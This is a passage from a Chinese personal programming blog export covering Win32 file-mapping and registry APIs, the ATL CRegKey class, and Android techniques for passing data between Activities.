<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">MapViewOfFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFileMappingObject,  <span class="comment">// file-mapping object to map into </span></span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="comment">// address space</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwDesiredAccess,      <span class="comment">// access mode</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetHigh,     <span class="comment">// high-order 32 bits of file offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileOffsetLow,      <span class="comment">// low-order 32 bits of file offset</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwNumberOfBytesToMap  <span class="comment">// number of bytes to map</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>第二个参数就是一个权限类型<ul>
<li>FILE_MAP_READ</li>
<li>FILE_MAP_WRITE</li>
<li>FILE_MAP_ALL_ACCESS</li>
<li>FILE_MAP_COPY</li>
</ul>
</li>
<li>第三四个参数就是起始位置</li>
<li>最后一个参数给0就是映射整个文件大小</li>
</ol>
<p>函数返回成功的话呢给的是我们一个内存地址，失败返回NULL</p>
<h2 id="撤销映射UnmapViewOfFile"><a href="#撤销映射UnmapViewOfFile" class="headerlink" title="撤销映射UnmapViewOfFile"></a>撤销映射<code>UnmapViewOfFile</code></h2><p>函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnmapViewOfFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBaseAddress   <span class="comment">// address where mapped view begins</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>很简单就是内存地址<br>然后我们调用<code>CloseHandle</code>关闭句柄</p>
<h2 id="立即刷新-FlushViewOfFile"><a href="#立即刷新-FlushViewOfFile" class="headerlink" title="立即刷新 FlushViewOfFile"></a>立即刷新 <code>FlushViewOfFile</code></h2><p>立即刷新，如果不是的话呢就和之前的文件操作一样，关闭的时候才会（删除对象的时候才会立即刷新）。<br>函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">FlushViewOfFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBaseAddress,       <span class="comment">// start address of byte range to flush</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwNumberOfBytesToFlush <span class="comment">// number of bytes in range</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>最后一个参数还是0的话呢是全部。</p>
<p>先介绍的这里，之后介绍实例。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity全局对象传递数据</title>
    <url>/2020/01/29/Activity%E5%85%A8%E5%B1%80%E5%AF%B9%E8%B1%A1%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="Activity全局对象传送数据"><a href="#Activity全局对象传送数据" class="headerlink" title="Activity全局对象传送数据"></a>Activity全局对象传送数据</h1><p>其实这个全局对象呢，我感觉这个名字听得总是怪怪的，确实没有Windows气的名字好听说实话的，在Windows下也称这个东西叫做实例对象，就是在winmain函数传递过来的那个instance，这里的话呢也是，这里也需要说一下这个安卓程序的一个入口点</p>
<h2 id="安卓程序的入口点"><a href="#安卓程序的入口点" class="headerlink" title="安卓程序的入口点"></a>安卓程序的入口点</h2><p>安卓程序的入口点其实和MFC基本上是大同小异，学多了我感觉这两个没啥太大的区别，同样的MFC是有一个全局的APP变量，由于是一启动就初始化，所以在它里面写东西，就有点像初始化，在安卓中呢，是一个类继承了Application这个类，例如下面：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppcationTest</span> <span class="keyword">extends</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String Name;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		Name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继承了Application，然后重写onCreate函数，这个函数应该是必须要的吧，然后在我们的Manifest中定义我们的实例对象：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:name=".AppcationTest"</span><br></pre></td></tr></table></figure>
<p>这个样子我们就进行了定义，上面配置就是说我们的入口类是哪个（我那个单词拼写错了，我也就没改）<br>改完之后我们就可以在传输断这么写：</p>
<ol>
<li>输入端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = (AppcationTest)getApplication();</span><br><span class="line">app.setName(<span class="string">"Test"</span>);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在接收端这么写：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = (AppcationTest)getApplication();</span><br><span class="line">Log.d(<span class="string">"ooo"</span>, app.getName());</span><br></pre></td></tr></table></figure>
<p>这个样子我们就进行了数据传递。</p>
<h2 id="程序的优化"><a href="#程序的优化" class="headerlink" title="程序的优化"></a>程序的优化</h2><p>我们可以观察到，我们有一个<code>getApplication</code>这个么一个方法，其实在MFC中这个函数是全局的（类似于AfxXXX），但是这个地方这个方法是来自于Activity这个类的，所以我们要想获得的话呢必须要继承Activity这个，这就很麻烦了，所以我们想到了可以使用静态的一个方法，具体实现方法如下：</p>
<ol>
<li>全局对象</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> AppcationTest instance = <span class="keyword">new</span> AppcationTest();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> AppcationTest <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>输入端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = AppcationTest.getInstance();</span><br><span class="line">app.setName(<span class="string">"Test"</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>接收端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = AppcationTest.getInstance();</span><br><span class="line">Log.d(<span class="string">"ooo"</span>, app.getName());</span><br></pre></td></tr></table></figure>

<p>这个样子我们就能很方便的进行数据的传输了。</p>
<p>但是我们发现当我们的程序十分的大的时候我们的数据变量会是非常的多，因为我们的全局对象会有很多的变量，所以我们在这个时候我们就会想到Map集合，这个东西我也是刚了解没多久（我也是学习java没多久的时间）</p>
<p>具体如何实现呢？看下面示例代码：</p>
<ol>
<li>全局对象：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String,Object&gt;();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> HashMap&lt;String, Object&gt; <span class="title">getMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>输入端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = AppcationTest.getInstance();</span><br><span class="line">app.getMap().put(<span class="string">"Name"</span>, <span class="string">"Wker"</span>);</span><br><span class="line">app.getMap().put(<span class="string">"Age"</span>, <span class="number">19</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>接收端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = AppcationTest.getInstance();</span><br><span class="line">Log.d(<span class="string">"ooo"</span>, (String) app.getMap().get(<span class="string">"Name"</span>));</span><br><span class="line">Log.d(<span class="string">"ooo"</span>, (Integer) app.getMap().get(<span class="string">"Age"</span>)+<span class="string">""</span>);</span><br></pre></td></tr></table></figure>

<p>这个样子我们的代码就优化完毕了。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity数据传递2</title>
    <url>/2020/01/29/Activity%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%922/</url>
    <content><![CDATA[<h2 id="Activity数据传递通过静态变量"><a href="#Activity数据传递通过静态变量" class="headerlink" title="Activity数据传递通过静态变量"></a>Activity数据传递通过静态变量</h2><p>之前说可以通过一些方法进行数据的传递，其实仔细想一下，我们无非就是在类中进行数据集的交互罢了，所以我们可以是用静态变量这种方法进行数据的传递。</p>
<ol>
<li>传递类</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">push2</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String Name;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		Name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>输入端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> push2 cs = <span class="keyword">new</span> push2();</span><br><span class="line">cs.setName(<span class="string">"aaa"</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>接收端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> push2 obj = <span class="keyword">new</span> push2();</span><br><span class="line">obj = MainActivity.cs;</span><br><span class="line">Log.d(<span class="string">"test"</span>, obj.getName());</span><br></pre></td></tr></table></figure>

<p>这个样子我们就实现了类中的数据传递，<br>还有一种方法就是在<br>但是有一点我们需要注意就是在窗口返回和销毁的时候我们需要将我们的这个成员变量进行销毁。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onDestroy();</span><br><span class="line">	obj = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个样子就可以进行数据传递了</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity数据传递</title>
    <url>/2020/01/29/Activity%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92/</url>
    <content><![CDATA[<h1 id="Activity之间的数据传递"><a href="#Activity之间的数据传递" class="headerlink" title="Activity之间的数据传递"></a>Activity之间的数据传递</h1><p>这个就比较典型，就和Windows下一样，但是比Windows下方便许多，只需要调用几个比较简单的方法就可以进行数据的传递。</p>
<h2 id="基本数据类型的传递"><a href="#基本数据类型的传递" class="headerlink" title="基本数据类型的传递"></a>基本数据类型的传递</h2><p>基本数据类型的传递是最简单得了相比之下，我们只需要使用一个成员方法写入数据就可以了，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">intent.putExtra(<span class="string">"Data"</span>,test);</span><br></pre></td></tr></table></figure>
<p>这个<code>putExtra</code>方法有许多重载，基本数据类型都包含了，在我们的接收端我们只需要调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Bundle bundle = getIntent().getExtras();</span><br><span class="line">bundle.getString(<span class="string">"Data"</span>);</span><br></pre></td></tr></table></figure>
<p>这个样子我们就能成功进行数据之间的交互了。</p>
<h2 id="类的传递"><a href="#类的传递" class="headerlink" title="类的传递"></a>类的传递</h2><p>类的传递分为两种方法，一种是Java自带的，另一种是Android提供给我们的，各有好处，下面进行介绍。</p>
<h3 id="序列化传递"><a href="#序列化传递" class="headerlink" title="序列化传递"></a>序列化传递</h3><p>序列化的传递方法，就是将我们的类实现序列化，然后再传递的时候使用就好了，这个方法也是比较简单的，但是是有缺点的，因为序列化是持久化的一个操作，所以会在本地生成数据，具体的实现方法：</p>
<ol>
<li>传递类</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">push</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String Name;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetName</span> <span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		Name = name;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">GetName</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>发送端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">push test = <span class="keyword">new</span> push();</span><br><span class="line">test.SetName(<span class="string">"iii"</span>);</span><br><span class="line">intent.putExtra(<span class="string">"Data"</span>,test);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>接收端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> EditText edt01;</span><br><span class="line">edt01 = (EditText)findViewById(R.id.editText1);</span><br><span class="line">edt01.setText(((push)bundle.get(<span class="string">"Data"</span>)).GetName());</span><br></pre></td></tr></table></figure>
<p>这个样子就可以进行数据的交互了，多了一步序列化和强制转换，也是相对而言方便的。</p>
<h3 id="Parcelable传递"><a href="#Parcelable传递" class="headerlink" title="Parcelable传递"></a>Parcelable传递</h3><p>这个方法有点繁琐，但是比较固定，就是说不是太需要理解为啥这样写，反正按模式进行些就好了，我们同样还是先写类：</p>
<ol>
<li>传递类</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.location.Criteria;</span><br><span class="line"><span class="keyword">import</span> android.os.Parcel;</span><br><span class="line"><span class="keyword">import</span> android.os.Parcelable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">push</span> <span class="keyword">implements</span> <span class="title">Parcelable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String Name;</span><br><span class="line">	<span class="keyword">private</span> String Age;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetName</span> <span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		Name = name;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">GetName</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Parcelable.Creator&lt;push&gt; CREATOR = <span class="keyword">new</span> Creator&lt;push&gt;() &#123;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> push <span class="title">createFromParcel</span><span class="params">(Parcel source)</span> </span>&#123;</span><br><span class="line">			push test = <span class="keyword">new</span> push();</span><br><span class="line">			test.setAge(source.readString());</span><br><span class="line">			test.SetName(source.readString());</span><br><span class="line">			<span class="keyword">return</span> test;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">public</span> push[] newArray(<span class="keyword">int</span> size) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;;</span><br><span class="line">			</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">describeContents</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">		dest.writeString(Age);</span><br><span class="line">		dest.writeString(Name);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(String age)</span> </span>&#123;</span><br><span class="line">		Age = age;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发送端接收端不变，和我们序列化的时候操作是一样的，这里稍微有一写要说的。</p>
<ul>
<li>必须要有个静态成员<code>public static Parcelable.Creator&lt;push&gt; CREATOR = new Creator&lt;push&gt;()</code>然后实现里面的两个方法</li>
<li><code>writeToParcel</code>这个里面的顺序要和<code>createFromParcel</code>这个里面的顺序是一致的，否则应该会出现错误</li>
<li><code>createFromParcel</code>这个方法最后需要返回我们new的那个对象。</li>
</ul>
<p>这个方法的好处其实就是不是本地写入，是在内存中进行读写，而且速度要快一些，但是就是有一点繁琐。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>CRegKey</title>
    <url>/2020/01/29/CRegKey/</url>
    <content><![CDATA[<h2 id="CRegKey"><a href="#CRegKey" class="headerlink" title="CRegKey"></a><code>CRegKey</code></h2><p>之前说的这个忘记加上去了，补充一下，这个的话呢其实就是说方便我们的调用。<br>比较特殊的是这个类不是MFC的，而是<code>#include &lt;atlbase.h&gt;</code><br>而且类的函数比较简单，调用起来十分的方便。</p>
<ul>
<li>Attach Attaches a registry key handle to the CRegKey object.  </li>
<li>Close Releases m_hKey.  </li>
<li>Create Creates or opens the specified key.  </li>
<li>CRegKey Constructor.  </li>
<li>DeleteSubKey Deletes the specified key.  </li>
<li>DeleteValue Deletes a value field of the key identified by m_hKey.  </li>
<li>Detach Detaches m_hKey from the CRegKey object.  </li>
<li>Open Opens the specified key.  </li>
<li>QueryValue Retrieves the data for a specified value field.  </li>
<li>RecurseDeleteKey Deletes the specified key and explicitly deletes all subkeys.  </li>
<li>SetKeyValue Stores data in a specified value field of a specified key.  </li>
<li>SetValue Stores data in a specified value field.<br>但是有一点需要注意，如果想要立即写入的话呢要调用Flush方法，这个在我这个2001年的MSDN好像没有说明。</li>
</ul>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>注册表操作</title>
    <url>/2020/01/28/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="注册表介绍"><a href="#注册表介绍" class="headerlink" title="注册表介绍"></a>注册表介绍</h1><p>下面内容摘自网络：<a href="http://www.sohu.com/a/232058468_99914465" target="_blank" rel="noopener">http://www.sohu.com/a/232058468_99914465</a></p>
<p>注册表的结构包括六大分支（有的是五大分支，如果是五大分支，就没有hkey-dyn-data这一结构），注册表编辑器与资源管理器的界面相似。</p>
<p>注册表编辑器左窗格显示六大分支，右窗格是相应的键值项。我们编辑注册表，就是修改和增加相应的键值项。</p>
<p>注册表的六大分支结构如下：</p>
<p>hkey-classes-root该主关键字包含了有关的OLE信息，以便在系统工作过程中实现对各种文件和文档信息的访问。具体的内容有已经注册的文件扩展名、文件类型、文件图标等。</p>
<p>hkey-current-user是一个指向HKEY_USERS结构中某个分支的指针，它包含当前用户的登录信息。实际上它就是HKEY_USERS＼Default下面的一部分内容，如果在HKEY_USERS＼Default下面没有用户登录的其它内容，那么这两个主关键字包含的内容是完全相同的。</p>
<p>hkey-local-machine该关键字包含了本地计算机（相对网络环境而言）的硬件和软件的全部信息。当系统的配置和设置发生变化时，本关键字下面的登录项也将随之改变。</p>
<p>hkey-users 所有登录用户的信息。</p>
<p>hkey-current-config这个关键字实际上也是指向HKEY_LOCAL _MACHINE＼Config结构中的某个分支的指针。HKEY_CURRENT_CONFIG下面的子关键字及内容与HKEY_LOCAL _MACHINE＼Config＼0001分支下面的子关键字及内容是完全相同的。本关键字包含的主要内容是计算机的当前配置情况，如显示器、打印机等可选外部设备及其设置信息等，而且这个配置信息均将根据当前连接的网络类型、硬件配置以及应用软件的安装不同而有所变化。</p>
<p>hkey-dyn-data 即插即用和系统性能的动态信息。</p>
<p>对于 Windows98 来说包含了六个主键，而在 Windows 2003/2000/XP 中没有 HKEY_DYN_DATA 主键，所以对于 Windows 2003/2000/XP 来说只有五个主键。</p>
<p>注册表中的键值项数据可分为如下三种类型：</p>
<p>1.字符串值（S）</p>
<p>在Windows98的注册表中，表示文件的描述、硬件的标识等等信息一般都用字符串值。字符串值由字母和数字组成，它的最大长度不能超过255个字符。通过键、键值就组成了一种键值项数据，这就相当于Win.ini、Ssytem.ini文件中每个小节下面的设置行一样的道理。</p>
<p>2.二进制值（B）</p>
<p>在Windows的注册表中，二进制值是没有长度限制的，可以是任意个字节长。在注册表编辑器中，二进制以十六进制的方式显示出来。</p>
<p>3.DWORD值（D）</p>
<p>在Windwos98的注册表中，DWORD值是一个32位（双字节长）长度的数值。在注册表编辑器中，系统以十六进制的方式显示DWORD值。</p>
<p>主要是我不想敲键盘了哈哈哈。<br>那么我们看一下微软给我们编写他的一些操作函数吧。</p>
<h2 id="打开关闭子键RegCreateKeyEx与RegCloseKey"><a href="#打开关闭子键RegCreateKeyEx与RegCloseKey" class="headerlink" title="打开关闭子键RegCreateKeyEx与RegCloseKey"></a>打开关闭子键<code>RegCreateKeyEx</code>与<code>RegCloseKey</code></h2><p>关闭打开是操作注册表最基本的一些操作了，首先是<code>RegCreateKeyEx</code>这个函数参数有点多，但是还是很好理解的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegCreateKeyEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,                <span class="comment">// handle to an open key</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpSubKey,         <span class="comment">// address of subkey name</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD Reserved,           <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpClass,           <span class="comment">// address of class string</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwOptions,          <span class="comment">// special options flag</span></span></span></span><br><span class="line"><span class="function"><span class="params">  REGSAM samDesired,        <span class="comment">// desired security access</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// address of key security structure</span></span></span></span><br><span class="line"><span class="function"><span class="params">  PHKEY phkResult,          <span class="comment">// address of buffer for opened handle</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpdwDisposition   <span class="comment">// address of disposition value buffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>hKey</code>：这个值其实是一个之前已经打开的键或者说是那六个根键</li>
</ol>
<ul>
<li>HKEY_CLASSES_ROOT</li>
<li>HKEY_CURRENT_CONFIG</li>
<li>HKEY_CURRENT_USER</li>
<li>HKEY_LOCAL_MACHINE</li>
<li>HKEY_USERS</li>
<li>Windows NT: HKEY_PERFORMANCE_DATA </li>
<li>Windows 95 and Windows 98: HKEY_DYN_DATA </li>
</ul>
<ol start="2">
<li><code>lpSubKey</code>：指向以null结尾的字符串的指针，该字符串指定此函数打开或创建的子键的名称。指定的子键必须是由hKey参数标识的键的子键。此子键不能以反斜杠字符(‘&#39;)开头。此参数不能为空。</li>
<li><code>dwOptions</code>：指定键的特殊选项。此参数可以是以下值之一。</li>
</ol>
<ul>
<li>REG_OPTION_NON_VOLATILE   重启不丢失</li>
<li>REG_OPTION_VOLATILE       重启丢失</li>
<li>REG_OPTION_BACKUP_RESTORE </li>
</ul>
<ol start="4">
<li><code>samDesired</code>：可以是下面这几个值：</li>
</ol>
<ul>
<li>KEY_ALL_ACCESS Combination of KEY_QUERY_VALUE, KEY_ENUMERATE_SUB_KEYS, KEY_NOTIFY, KEY_CREATE_SUB_KEY, KEY_CREATE_LINK, and KEY_SET_VALUE access. </li>
<li>KEY_CREATE_LINK Permission to create a symbolic link. </li>
<li>KEY_CREATE_SUB_KEY Permission to create subkeys. </li>
<li>KEY_ENUMERATE_SUB_KEYS Permission to enumerate subkeys. </li>
<li>KEY_EXECUTE Permission for read access. </li>
<li>KEY_NOTIFY Permission for change notification. </li>
<li>KEY_QUERY_VALUE Permission to query subkey data. </li>
<li>KEY_READ Combination of KEY_QUERY_VALUE, KEY_ENUMERATE_SUB_KEYS, and KEY_NOTIFY access. </li>
<li>KEY_SET_VALUE Permission to set subkey data. </li>
<li>KEY_WRITE Combination of KEY_SET_VALUE and KEY_CREATE_SUB_KEY access. </li>
</ul>
<ol start="5">
<li><code>phkResult</code>这个返回我们打开的一个句柄。</li>
<li><code>lpdwDisposition</code>：下面这几个值：</li>
</ol>
<ul>
<li>REG_CREATED_NEW_KEY The key did not exist and was created. </li>
<li>REG_OPENED_EXISTING_KEY The key existed and was simply opened without being changed. </li>
</ul>
<p>还是比较好理解的，英语看不懂的稍微百度一下就好了，一般看名字就知道什么意思了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegCloseKey</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey   <span class="comment">// handle to key to close</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这个及时用来关闭的，就一个参数。</p>
<h2 id="删除子键RegDeleteKey"><a href="#删除子键RegDeleteKey" class="headerlink" title="删除子键RegDeleteKey"></a>删除子键<code>RegDeleteKey</code></h2><p>删除一个子键用函数：<code>RegDeleteKey</code><br>参数很是简单：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegDeleteKey</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,         <span class="comment">// handle to open key</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpSubKey   <span class="comment">// address of name of subkey to delete</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>但是在这里需要注意的是，只有所有有关这个子键的句柄都被关闭了之后才会删除完毕，而且好像在老板的电脑里面我们的这个函数是不支持递归删除的，现在好像已经支持了，再说了，在往前几年，都不用注册表，用个什么C盘里面的ini配置文件我记得，当时32位操作系统还没有很普及，这个应该是16位操作系统时候的了，具体的我也忘记了，反正是很老了。</p>
<h2 id="键值操作"><a href="#键值操作" class="headerlink" title="键值操作"></a>键值操作</h2><p>首先是设置一个键值，我们用到的函数是：<code>RegSetValueEx</code>，函数的原型：</p>
